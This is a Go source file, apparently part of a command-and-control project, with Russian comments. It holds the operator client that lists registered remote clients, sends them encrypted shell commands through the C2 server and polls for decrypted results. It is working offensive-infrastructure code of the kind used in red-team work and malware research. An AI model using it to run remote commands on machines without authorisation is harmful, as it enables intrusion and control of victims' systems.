package operator

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"time"

	"c2project/internal/crypto"
	"c2project/internal/protocol"
)

// Client — HTTP-клиент к C2-серверу.
type Client struct {
	baseURL    string
	httpClient *http.Client
	pollEvery  time.Duration
}

// NewClient создаёт HTTP-клиент.
func NewClient(baseURL string) *Client {
	return &Client{
		baseURL:    baseURL,
		httpClient: &http.Client{Timeout: 10 * time.Second},
		pollEvery:  2 * time.Second,
	}
}

// ListClients запрашивает список зарегистрированных клиентов.
func (c *Client) ListClients(ctx context.Context) ([]protocol.ClientInfo, error) {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, c.baseURL+protocol.EndpointList, nil)
	if err != nil {
		return nil, fmt.Errorf("build request: %w", err)
	}
	resp, err := c.httpClient.Do(req)
	if err != nil {
		return nil, fmt.Errorf("do request: %w", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("status %d", resp.StatusCode)
	}
	var list []protocol.ClientInfo
	if err := json.NewDecoder(resp.Body).Decode(&list); err != nil {
		return nil, fmt.Errorf("decode: %w", err)
	}
	return list, nil
}

// Submit отправляет команду на C2, возвращает task_id.
func (c *Client) Submit(ctx context.Context, clientID, command string) (string, error) {
	encCommand, err := crypto.Encrypt(protocol.KeyTerminalToC2, []byte(command))
	if err != nil {
		return "", fmt.Errorf("encrypt: %w", err)
	}
	body := protocol.SubmitRequest{
		ClientID: clientID,
		Command:  base64.StdEncoding.EncodeToString(encCommand),
	}
	raw, err := json.Marshal(body)
	if err != nil {
		return "", fmt.Errorf("marshal: %w", err)
	}
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, c.baseURL+protocol.EndpointSubmit, bytes.NewReader(raw))
	if err != nil {
		return "", fmt.Errorf("build request: %w", err)
	}
	req.Header.Set("Content-Type", "application/json")
	resp, err := c.httpClient.Do(req)
	if err != nil {
		return "", fmt.Errorf("do request: %w", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		msg, _ := io.ReadAll(resp.Body)
		return "", fmt.Errorf("status %d: %s", resp.StatusCode, string(msg))
	}
	var sr protocol.SubmitResponse
	if err := json.NewDecoder(resp.Body).Decode(&sr); err != nil {
		return "", fmt.Errorf("decode: %w", err)
	}
	return sr.TaskID, nil
}

// WaitResult периодически опрашивает C2, пока задача не выполнена.
func (c *Client) WaitResult(ctx context.Context, taskID string) (string, error) {
	ticker := time.NewTicker(c.pollEvery)
	defer ticker.Stop()
	for {
		select {
		case <-ctx.Done():
			return "", ctx.Err()
		case <-ticker.C:
			result, done, err := c.fetchStatus(ctx, taskID)
			if err != nil {
				return "", err
			}
			if done {
				return result, nil
			}
		}
	}
}

// fetchStatus делает один запрос статуса задачи.
func (c *Client) fetchStatus(ctx context.Context, taskID string) (string, bool, error) {
	url := c.baseURL + protocol.EndpointStatus + "?id=" + taskID
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
	if err != nil {
		return "", false, fmt.Errorf("build request: %w", err)
	}
	resp, err := c.httpClient.Do(req)
	if err != nil {
		return "", false, fmt.Errorf("do request: %w", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return "", false, fmt.Errorf("status %d", resp.StatusCode)
	}
	var sr protocol.StatusResponse
	if err := json.NewDecoder(resp.Body).Decode(&sr); err != nil {
		return "", false, fmt.Errorf("decode: %w", err)
	}
	if sr.Status != protocol.StatusDone {
		return "", false, nil
	}
	decoded, err := base64.StdEncoding.DecodeString(sr.Result)
	if err != nil {
		return "", true, fmt.Errorf("base64: %w", err)
	}
	plain, err := crypto.Decrypt(protocol.KeyTerminalToC2, decoded)
	if err != nil {
		return "", true, fmt.Errorf("decrypt: %w", err)
	}
	return string(plain), true, nil
}